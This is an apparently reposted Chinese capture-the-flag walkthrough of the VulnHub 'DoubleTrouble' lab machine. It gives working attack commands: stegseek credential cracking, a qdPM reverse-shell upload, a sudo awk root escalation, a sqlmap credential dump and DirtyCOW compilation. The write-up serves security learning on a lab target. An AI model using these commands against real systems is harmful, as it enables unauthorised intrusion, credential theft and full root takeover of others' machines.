> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sKXnlUBGg2wDtWd7FMjDJw)

**下载地址**

```
https://www.vulnhub.com/entry/doubletrouble-1,743/
```

**环境搭建**

```
VirtualBox，vmware
靶机：192.168.56.106
kali：192.168.56.102
```

**获取靶机 IP**

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKulQ82BahfiaOvQVAciaJefWSeibqELcOsdhcgBBFyAstX7RBMP3A8iajnUA/640?wx_fmt=png)

```
靶机IP为：192.168.56.106
```

**端口扫描**

```
nmap -A 192.168.56.106 -p 1-65535
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuejBYTY8m6IQwFNJYyO34KG38VlicqWWvhibiatw03fzmO9VG5E4lWzJMQ/640?wx_fmt=png)

发现开启了 22，80 端口

打开网站，发现是一个后台登陆界面  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKu1VIQBjErt7oCqEf8z563yNoz8MqVNibQA8ibudG3NRtdT8sdOnYVuzuw/640?wx_fmt=png)

最下面也可以看到是 qdPM9.1，尝试了万能密码，和弱口令都无法进行登录，sql 注入也没法进行注入。

看上去有点像是 shiro 框架，利用 shiro 反序列化工具进行测试，无果。  
通过搜索引擎查找相关的漏洞，发现都是要登录后台才能利用的

**目录扫描**

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKunDZkVPHxiboPI0zC5WHmodBE90gXPszjuIzibroNnRYFHMYbapgem5Vw/640?wx_fmt=png)

在 install 目录中发现的也是 qdPM9.1

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKu7e8GIQb6F4eycNpe5OPkSeMIVjGibibticlgmayE2hImJNfpUuaW6NDXw/640?wx_fmt=png)

在 secret 中有一张奇怪的图  doubletrouble.jpg。和靶机的名字一毛一样  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuRpvOneQC2gkzGRo0J3sibQIIAAwN0aFKOh03tu2xXcgeZMC8dicyjG9g/640?wx_fmt=png)

使用 stegseek 对图片进行解密  只能在 linux 中安装，我是在 kali 里安装的

```
github：https://github.com/RickdeJager/stegseek/releases
```

kali 自带了 rockyou.txt，不过可能是 rockyou.txt.gz 形式，需要解压一下

```
gunzip /usr/share/wordlists/rockyou.txt.gz   #解压
sudo stegseek ./doubletrouble.jpg /usr/share/wordlists/rockyou.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuMtyic2Wgu8sGORia1bziaYmutGj0iatTgo8hP70DUWvHsVss4ZK20Kc3yQ/640?wx_fmt=png)  

果然这张图有问题     得到账号和密码

```
otisrush@localhost.com/otis666
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKum4lwh1taNTjXSLnPwsYBFouWJSGkGNUSr5q8S5AduibSr97l8zpRpCA/640?wx_fmt=png)

成功登录了后台

**qdPM 漏洞利用**  

在 db 里的一个远程代码执行漏洞

https://www.exploit-db.com/exploits/50175

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKucapuKp9zxD69u2gddWSYBv97lJHjdfzW6krYhzr3WFPKOA4LSy7Z4A/640?wx_fmt=png)

把这个下载下来，在本地使用 python 运行，格式有点问题 ，有些地方需要把回车调一下

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKulPacGqqCKBTwZsDFwGribhtBib2t9yGgMuGE6DO9tOoIjTKx9ia3FbzeA/640?wx_fmt=png)

脚本出错，，在 upload / 目录下没有看到上传的 shell，上传失败。

分析漏洞代码，发现就是用户的 myAccount 界面的图片那一栏是可以上传文件的，那我们就可以上传一个 php 反弹 shell 的脚本。  

上传 shell 的地址：

```
http://192.168.56.106/index.php/myAccount
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuCGh3TibJ4zkcpibDlZYXwYM0JJbwI0ib70sWPpsbqR4jeoEeSuA1Fbhiaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuUntktFLD2DBXsZT31NhILLxqNyIBswx8b06mibUm0QluZeMUh1868eg/640?wx_fmt=png)

看着是报错了，感觉没有上传成功，但是去 upload 目录进行查看，是上传成功了的

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKutwJeOVPGADRopF4qpvWaiay2MH821yHkZQdesmke5FbjtRxUc3nErSA/640?wx_fmt=png)

kali 监听自身端口 4444，刷新马子页面，即可获取执行 shell。  

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKu1BL1qqog5RLsV4cKqf80MVr90riakSXzjy8oABnwbCVIvqTcJfYh0lQ/640?wx_fmt=png)

提权

查看当前用户能使用 sudo 的权限 ，可免密执行 awk 命令

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKulpKkTVdlw0eYQX8RLu2ctGXf0p1lficT8Wg1bVvRaTbgTPfiahWEM4JA/640?wx_fmt=png)

搜索引擎搜索 awk，发现该命令可以进行提权，使用如下命令

```
sudo awk 'BEGIN{system("/bin/bash")}'
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKujMws3Fia8doF6gJFByd9pDGrtZT2Dq2uqoVD6Ergm69apmlxYaup0sw/640?wx_fmt=png)

获得了 root 权限  ，切换到 root 家目录

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKue1yaHR0vogKJNV8XHc4cMvc8qK49UxkujCFQQLJX9Zmicbyb0JxUqaQ/640?wx_fmt=png)

看到了一个和靶机一样的文件

查看靶机是否有 python 环境  

```
python –-version
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuZl5xtBvouMkwCosxa09OcsP23ic8lEA1O1Jzr8R8Mukw1hlFXz4nEwg/640?wx_fmt=png)

python 开启 http 服务进行下载

```
Python >= 2.4
python -m SimpleHTTPServer 8000
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuCM8Ul4jaTZO6yF3NR2Ukh8l8iarDVulkjBhsA9Bz0icjFoMQSheRvBlg/640?wx_fmt=png)

在本地导入下载的 doubletrouble.ova

**获取** **doubletrouble.ova 的 IP**

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuic3FRiaVgaFrGWc14CZjXI5VRmzS9FOyIGFDTj1DkVPrHMhYIiaaDV2OQ/640?wx_fmt=png)

```
靶机IP为：192.168.56.107
```

**端口扫描**

```
nmap -A -p 1-65535 192.168.56.107
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKu3sxTElXXAyicJdCpZJSp5T8HW22jiaVzTficuve43SicnYiaH8icvt7WSFyg/640?wx_fmt=png)

开启了 22 和 80 端口

80 端口进行查看网站是一个登录页面

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuwqLAYldv1cicar0WibYy5FBBUJXYgMFiaYOep8UdegI7neb3zKJvkPDbw/640?wx_fmt=png)

**目录扫描**

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuDePLCxiaAQUHfhOc488nFH0NK2ib9ibXt0BCkibdDLdKPwhCwr4wASjbNg/640?wx_fmt=png)

只得到了一个 index.php 页面也就是登录界面，进行万能密码的尝试

查看是否存在注入

burp 抓包，使用 sqlmap 测试发现是存在延时盲注

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKunddb6qAmAwpMhXI6YEhJ6zaTKHBgItibvRNqeotDqEAgTDReh3vOr6A/640?wx_fmt=png)

使用 sqlmap 跑出来两个账号密码

```
python2 sqlmap.py -r 111.txt -p uname -Ddoubletrouble -T users --dump
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuk2OAqibC8KWbrasz7j4GrXaf0S68FHIQZSAvtXvrxs9Ixb05SfqzAwg/640?wx_fmt=png)

使用这两个账号密码登录网站发现都是无法登录

尝试登录 ssh，使用第二个账号密码成功登录 ssh

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuK41kr98CskamPTTTJMwSDHIDnicU6y5Y7lUH2UfiajkiahaMlwW5NIGQA/640?wx_fmt=png)

**提权**  

不存在 sudo 命令

```
查看系统版本
uname -r
uname -a
得到的是3.2.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuxf2EXv5lBuiaFvuAsLlDKiaRUr6tcxmvZrdIdcQYnDuda69AS4ZKwm3g/640?wx_fmt=png)

```
cat /etc/*-release 发现是debain 7
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKu0133V8HoPeQCdWzYFNzIH5NLynJNAJ0vMGRp4xktblx2JsD9Wo64icw/640?wx_fmt=png)

搜索引擎查找相关提取漏洞，发现可以通过脏牛提权

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuecEXNrKIk4UhibMloC1fZotPRxeNIuuRemicuwQI6IICVdRTzTwlE0LA/640?wx_fmt=png)

```
Github：https://github.com/FireFart/dirtycow
```

这个 poc 可以生成一个账号名为 firefart 的 root 用户

下载 poc 上传到靶机的 tmp 目录下，然后编译，执行

```
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuicXCNMObibNia19GsmheMshUqWEBShXoQTCxdKxulm81KUrN3fHicy4ibAg/640?wx_fmt=png)

```
su – firefart
root
```

成功提权到 root 权限，获得 flag

![](https://mmbiz.qpic.cn/mmbiz_png/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuYm81KpSChhOia9PNXIvYtA9aD4iaaumc07UCJqldMibRE2byyfmshhobQ/640?wx_fmt=png)

**本次知识分享到这就结束了，谢谢大家的观看**  

**_可以加入微信群进行学习交流_**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/0YvAy5BgkyOcrEEBGfuI021gFgDcsXKuKGiaaECFP3tWgaVwod47s5L6osZeXFIfCGnkOo5O5ialWtfeWiaqibkicwA/640?wx_fmt=jpeg)